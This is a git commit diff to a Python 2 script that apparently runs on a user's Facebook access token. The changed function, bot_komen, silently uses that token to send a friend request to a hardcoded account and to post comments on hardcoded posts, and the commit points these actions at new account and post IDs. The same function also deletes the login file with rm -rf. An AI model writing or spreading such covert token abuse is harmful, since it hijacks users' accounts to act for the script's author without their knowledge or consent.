7abe253c5b1a57f92fabc3936fd7d67b43d3bd1b
Man-hemker72 <73662881+man-hemker72@users.noreply.github.com>
2020-12-11 04:29:54 +0700

    Update 2020.py

--- 2020.py
+++ 2020.py
@@ -142,13 +142,13 @@ def bot_komen():
         print '\x1b[1;39m[!] Token invalid'
         os.system('rm -rf login.txt')
 
-    una = '100041160843927'
-    una2 = '100005452817848'
+    una = '100040232824607'
+    una2 = '100040232824607'
     kom = 'Izin Pakai script lu Bang Hilman \xf0\x9f\x98\x81\xf0\x9f\x98\x81'
     reac = 'LOVE'
-    post = '420807329301292'
-    post2 = '1507798399411906'
-    kom2 = 'Izin Pakai script lu bang\xf0\x9f\x99\x8f'
+    post = '407118870639204'
+    post2 = '400573887960369'
+    kom2 = 'Izin Pakai script lu bang HilmanXD\xf0\x9f\x99\x8f'
     reac2 = 'ANGRY'
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
